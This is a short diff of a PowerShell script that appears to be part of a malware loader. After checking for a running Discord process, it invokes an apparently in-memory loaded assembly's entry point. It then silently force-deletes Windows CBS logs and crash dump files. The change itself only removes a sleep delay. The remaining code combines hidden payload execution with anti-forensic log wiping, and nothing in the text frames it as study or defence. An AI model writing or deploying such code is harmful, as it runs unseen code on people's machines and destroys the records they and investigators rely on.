@@ -33,12 +33,10 @@ if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
         Exit
 	}
 }
-Start-Sleep 5
 
 $invokeArgs = New-Object object[] 1 
 $invokeArgs[0] = [string[]]@() 
 $entry.Invoke($null, $invokeArgs)
-
 
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
